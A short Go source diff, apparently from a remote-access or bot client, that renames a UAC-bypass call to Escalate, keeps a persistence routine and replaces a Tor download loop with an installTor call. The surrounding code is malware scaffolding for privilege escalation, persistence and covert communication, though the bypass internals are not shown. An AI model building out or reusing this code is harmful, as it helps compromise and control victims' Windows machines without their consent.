@@ -1,3 +1,5 @@
+// +build !android
+
 package client
 
 import (
@@ -22,15 +24,17 @@ func copyExecuteable() error {
 	return ioutil.WriteFile(PathExe, data, os.ModePerm)
 }
 
+// Elevate elevate task
 func Elevate() error {
 	log.Println("Elevate")
 	err := copyExecuteable()
 	if err != nil {
 		return errors.New("Copy failed")
 	}
-	return Uacbypass(PathExe)
+	return Escalate(PathExe)
 }
 
+// CheckSetup check wheter already configured
 func CheckSetup() bool {
 	log.Println("CheckSetup")
 	osexe, _ := os.Executable()
@@ -44,16 +48,9 @@ func CheckSetup() bool {
 	return false
 }
 
+// Setup do setup
 func Setup() {
 	log.Println("Setup")
 	go Persist(PathExe)
-	for {
-		err := downloadTor()
-		if err == nil {
-			log.Println("Could not download Tor:", err)
-			break
-		}
-	}
-	setupTor()
-
+	installTor()
 }
